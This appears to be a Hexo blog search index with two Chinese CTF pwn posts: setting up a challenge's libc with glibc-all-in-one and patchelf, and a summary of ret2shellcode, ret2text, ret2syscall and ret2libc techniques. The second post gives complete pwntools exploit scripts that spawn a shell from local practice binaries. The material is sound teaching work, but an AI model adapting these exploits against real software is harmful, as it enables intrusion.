<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>添加修改pwn题的libc文件</title>
    <url>/2025/06/27/add-pwn-libc/</url>
    <content><![CDATA[<h1 id="添加修改pwn题的libc文件"><a href="#添加修改pwn题的libc文件" class="headerlink" title="添加修改pwn题的libc文件"></a>添加修改pwn题的libc文件</h1><p>参考文章：<a href="https://blog.csdn.net/m0_52772399/article/details/128182925#:~:text=%E6%A0%B9%E6%8D%AE%E5%BC%95%E7%94%A8%E5%92%8C%E5%BC%95%E7%94%A8%E7%9A%84%E4%BE%8B%E5%AD%90">关于glibc-all-in-one缺失libc_2.23-0ubuntu10 glibc-all-in-one-CSDN博客</a></p>
<p><a href="https://tsuk1ctf.github.io/post/17727.html">glibc-all-in-one添加libc - Tsuk1</a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ldd</span> pwn</span><br></pre></td></tr></table></figure>

<p>查看当前可执行文件的libc和ld版本</p>
<p><img src="/2025/06/27/add-pwn-libc/image-20250627213335462.png" alt="image-20250627213335462"></p>
<p>但是这个版本是错的，我们要通过题目给的libc找到正确版本（有些题目的libc未泄露，要我们自己去获得）</p>
<p><strong>获取正确版本</strong></p>
<p>查看题目给的libc文件，能够在其中找到正确的elf可执行文件应该使用的libc和ld版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$strings</span> ./libc-x.xx | grep ubuntu</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/27/add-pwn-libc/image-20250627101829057.png" alt="image-20250627101829057"></p>
<p>这里可发现使用的libc版本是2.19-0ubuntu6.15</p>
<h2 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h2><p>我们要下载对应的两个libc6和libc6-dbg两个文件，要能找到他们两的下载地址，这个很麻烦，我拿我上面的2.19版本举例子</p>
<h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>直接在网站上搜索<code>2.19-0ubuntu6.15</code>版本，找到ubuntu官方的一个下载网站</p>
<p><img src="/2025/06/27/add-pwn-libc/image-20250627115924472.png" alt="image-20250627115924472"></p>
<p>该网站路径：<code>[2.19-0ubuntu6.15 : libc6-x32-dbgsym : amd64 : Trusty (14.04) : Ubuntu](https://launchpad.net/ubuntu/trusty/amd64/libc6-x32-dbgsym/2.19-0ubuntu6.15)</code></p>
<p>但是该网站并非我们要找的两个文件的下载网站，我们要下载的是libc6和libc6-dbg</p>
<h3 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h3><h4 id="—–已经淘汰的演示"><a href="#—–已经淘汰的演示" class="headerlink" title="—–已经淘汰的演示"></a>—–已经淘汰的演示</h4><p>将网址<code>libc6-x32-dbgsym</code>更改为上面两项，找到这两个地址安装路径</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/trusty/i386/libc6/2.19-0ubuntu6.15</span><br><span class="line">https://launchpad.net/ubuntu/trusty/i386/libc6-dbg/2.19-0ubuntu6.15</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/27/add-pwn-libc/image-20250627154436404.png" alt="image-20250627154436404"></p>
<p>down是download更改的，自定义的sh，用于扩展glibc中的新libc文件</p>
<p><img src="/2025/06/27/add-pwn-libc/image-20250627154551898.png" alt="image-20250627154551898"></p>
<p>更改这两个位置的路径，执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sudo</span> ./down 2.19-0ubuntu6.15_i386</span><br></pre></td></tr></table></figure>

<p>即可下载下来</p>
<h4 id="—–新演示"><a href="#—–新演示" class="headerlink" title="—–新演示"></a>—–新演示</h4><p>上述是用shell脚本写的，已经被淘汰了，我不知道他怎么用shell脚本找到的下载链接进行下载，反正我一直不行</p>
<p>用python脚本，glibc下的down.py文件</p>
<p><img src="/2025/06/27/add-pwn-libc/image-20250627173913799.png" alt="image-20250627173913799"></p>
<p>urls内里面是想拉取的网址，可以拉取多个链接</p>
<p>folder_name就是我们想存储在libs文件夹下自定义的文件夹名，更改这三处就可以</p>
<h3 id="步骤三"><a href="#步骤三" class="headerlink" title="步骤三"></a>步骤三</h3><p>文件已经被下载到了指定文件夹下</p>
<p><img src="/2025/06/27/add-pwn-libc/image-20250627203142618.png" alt="image-20250627203142618"></p>
<p>接下来在 glibc-all-in-one 下使用extract生成版本文件</p>
<p>生成的 libc 二进制文件我存放在了<code>/libs/2.19-0ubuntu6.15_i386</code>文件夹下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./extract libs/2.19-0ubuntu6.15_i386/libc6_2.19-0ubuntu6.15_i386.deb libs/2.19-0ubuntu6.15_i386</span><br></pre></td></tr></table></figure>

<p>对于 libc6-dbg 生成的 libc 调试文件我放在了<code>glibc-all-in-one/libs/2.19-0ubuntu6.15_i386/.debug</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./extract libs/2.19-0ubuntu6.15_i386/libc6-dbg_2.19-0ubuntu6.15_i386.deb libs/2.19-0ubuntu6.15_i386/.debug</span><br></pre></td></tr></table></figure>

<p>注意：<strong>前后两个路径要么都以<code>libs</code>开头，表示当前文件夹下路径，要么都用绝对路径做开头<code>/libs</code>开头表示的就是从根目录开始寻找</strong>，否则会识别不了路径和文件</p>
<p><img src="/2025/06/27/add-pwn-libc/image-20250627205603597.png" alt="image-20250627205603597"></p>
<p>目前做pwn栈溢出题目换ld和libc文件不需要用到libc 调试文件，也就是第二条命令暂时用不到</p>
<h2 id="修改libc和ld"><a href="#修改libc和ld" class="headerlink" title="修改libc和ld"></a>修改libc和ld</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$patchelf</span> --replace-needed libc.so.6 /home/pie/glibc-all-in-one/libs/2.19-0ubuntu6.15_i386/libc-2.19.so level3		<span class="comment">#更改libc</span></span><br><span class="line"><span class="variable">$patchelf</span> --set-interpreter /home/pie/glibc-all-in-one/libs/2.19-0ubuntu6.15_i386/ld-2.19.so level3	<span class="comment">#更改ld</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$patchelf</span> --replace-needed 原来第二行的==&gt;前的libc名 新的libc文件的路径 程序名</span><br><span class="line"><span class="variable">$patchelf</span> --set-interpreter 新的ld文件的路径 程序名</span><br></pre></td></tr></table></figure>



<p>终于改好了，改死我了，研究了一天，小问题真多，我真服了</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>32位，<code>i386-32-little</code>，路径为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/trusty/i386/libc6-dbg/2.19-0ubuntu6.15 #其中的amd64改为i386</span><br></pre></td></tr></table></figure>

<p>64位，把路径中的i386改用amd64就行</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Pwn前置</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2的几种攻击原理总结</title>
    <url>/2025/06/25/Several%20ret2%20Attack%20Principles/</url>
    <content><![CDATA[<h1 id="ret2的几种攻击原理总结"><a href="#ret2的几种攻击原理总结" class="headerlink" title="ret2的几种攻击原理总结"></a>ret2的几种攻击原理总结</h1><p>主要是对ret2libc3的详细过程总结</p>
<ul>
<li>修改返回地址，让其指向溢出数据中的一段指令（<strong>shellcode</strong>）</li>
<li>修改返回地址，让其指向内存中已有的某个函数（<strong>ret2text</strong>）</li>
<li>修改返回地址，让其指向内存中已有的数段指令（<strong>ret2syscall</strong>）</li>
<li><strong>有system无&#x3D;有&#x2F;bin&#x2F;sh</strong>，直接传入system地址和参数地址（<strong>ret2libc1</strong>）</li>
<li><strong>有system无&#x2F;bin&#x2F;sh</strong>，修改返回地址，传入bin_sh并执行system（<strong>ret2libc2</strong>）</li>
<li><strong>无system无&#x2F;bin&#x2F;sh</strong>，修改返回地址，让其执行libc中的函数（<strong>ret2libc3</strong>）</li>
</ul>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>buf2变量地址在bss段中，但是他的具体执行内容是存储在栈段中的，这里bss段可执行，所以我们能写入buf2所在的bss段中，能够执行shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;/home/pie/pwn-challenge/./ret2shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">payload+=p32(buf2)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>有后门函数的情况，将返回地址改为后门函数所在地址，直接ret执行后门函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x6c</span> + <span class="number">4</span>) + p32(target))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>通过Ropgadget找到gadget片段，然后构造系统调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binsh=<span class="number">0x080be408</span></span><br><span class="line">int_80=<span class="number">0x08049421</span></span><br><span class="line">pop_eax_ret=<span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret=<span class="number">0x0806eb90</span></span><br><span class="line"></span><br><span class="line">payload=flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>,pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,binsh,int_80])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;/home/pie/pwn-challenge/./ret2syscall&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>两次交互</p>
<p>思路：这里面并没有<code>/bin/sh</code>字段，存在栈溢出<code>gets</code>函数，存在<code>system</code>函数调用，我们的主体思路就是利用两次交互，第一次输入进行栈溢出漏洞利用，第二次进行<code>system</code>所需要的参数<code>/bin/sh</code>输入</p>
<p>上面的两次<code>p32(buf2)</code>就是利用了两次bss段中的<code>buf2</code>变量</p>
<h3 id="脚本对比"><a href="#脚本对比" class="headerlink" title="脚本对比"></a>脚本对比</h3><h4 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;/home/pie/pwn-challenge/./ret2libc2&quot;</span>)</span><br><span class="line">gets_plt=<span class="number">0x8048460</span></span><br><span class="line">sys_plt=<span class="number">0x8048490</span></span><br><span class="line">buf2=<span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload1+=p32(gets_plt)+p32(sys_plt)+p32(buf2)+p32(buf2)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>脚本一中为什么<code>payload1</code>中的函数会一直执行下去，因为执行完gets函数之后，函数之中自带一个<code>ret</code>，<code>ret</code>会影响到eip，使得<code>eip</code>弹出到<code>sys_plt</code>位置，同样<code>system</code>函数执行完之后，eip会弹出到第一个<code>buf2</code>位置</p>
<h4 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx_ret, buf2, system_plt, pop_ebx_ret, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>脚本二普适性更强，因为它不仅达到了目的，而且清理了栈段，让栈能够恢复平衡</p>
<p>在<code>ret address</code>处填<code>gets</code>函数地址，会跳转到<code>gets</code>函数执行，此时栈顶处于<code>pop_ebx_ret</code>处，之后gets函数调用结束会有一次<code>ret</code>，此时将<code>pop_ebx_ret</code>这条指令放入eip，esp向上到<code>buf2</code>位置，执行<code>pop_ebx_ret</code>指令，弹出<code>buf2</code>，esp依旧向上到<code>system_plt</code>位置，执行<code>ret</code>将<code>system_plt</code>命令放入eip，再重复上面操作…</p>
<p>这个操作过后，不仅达到了效果，而且实现了堆栈平衡，将我们人为添加的<code>buf2</code>变量进行了弹出</p>
<h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><h3 id="ret2libc3思路分析"><a href="#ret2libc3思路分析" class="headerlink" title="ret2libc3思路分析"></a>ret2libc3思路分析</h3><p>本题是一个基础的pwn攻击，原理是要利用泄露的信息，即libc中泄露出真实地址，来找出基址，进而用libc调用system函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反汇编代码</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **v4; <span class="comment">// [esp+4h] [ebp-11Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+8h] [ebp-118h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [esp+12h] [ebp-10Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [esp+112h] [ebp-Eh] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> **v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know return to library ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to see in memory?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me an address (in dec) :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xAu</span>);</span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">void</span> **)strtol(buf, v4, v5);</span><br><span class="line">  See_something(v8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Leave some message for me :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, src, <span class="number">0x100u</span>);</span><br><span class="line">  Print_message(src);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析这个程序，先分析下栈上一些函数变量的大概位置</p>
<table>
<thead>
<tr>
<th align="center">ebp</th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">v8</td>
<td align="center">变量在栈上的相对位置（看变量后和ebp的距离）</td>
</tr>
<tr>
<td align="center">buf</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">src</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">v5</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">v4</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Print_message</td>
<td align="center">先被调用的函数在栈的下面</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">dest</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">strcpy</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">See_something</td>
<td align="center"></td>
</tr>
</tbody></table>
<p>观察其中几个函数，其中see_something是打印v8变量的真实地址，而print_message中有一个strcpy</p>
<h4 id="关键点1：如何利用泄露的信息找出libc的基址"><a href="#关键点1：如何利用泄露的信息找出libc的基址" class="headerlink" title="关键点1：如何利用泄露的信息找出libc的基址"></a>关键点1：如何利用泄露的信息找出libc的基址</h4><p>这个题目中直接给了我们一个泄露地址函数，即为<code>See_something</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The content of the address : %p\n&quot;</span>, *a1);</span><br></pre></td></tr></table></figure>

<p>会将我们第一个传入的参数buf作为一个地址，并将这个地址的内容打印出来 -&gt; 也就是我们能通过传入一个地址获取该地址的内容</p>
<p>传入<code>puts_got</code>即能够获得puts的真实地址，再通过<code>libc.sym[&quot;puts&quot;]</code>获取到<code>puts</code>函数在libc中的偏移，<strong>基址&#x3D;真实地址-偏移</strong></p>
<h4 id="关键点2：找到pwn攻击点"><a href="#关键点2：找到pwn攻击点" class="headerlink" title="关键点2：找到pwn攻击点"></a>关键点2：找到pwn攻击点</h4><p>攻击点在<code>Print_message(src);</code>函数中，利用其中的strcpy进行栈溢出攻击，而前面的<code>See_something</code>和其他一些read则用来获得关键点1中的数据</p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,<span class="built_in">str</span>(elf.got[<span class="string">&quot;puts&quot;</span>]).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&quot; : &quot;</span>)</span><br><span class="line">libcBase=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcBase -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libcBase))</span><br><span class="line"></span><br><span class="line">payload=flat([cyclic(<span class="number">60</span>),libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>],<span class="number">0xdeadbeef</span>,<span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>))])</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>其中libc已经和视频课中给出的不同了，我们要用ldd指令进行查看，查看之后将查看出的路径填入libc</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Pwn做题</tag>
      </tags>
  </entry>
</search>
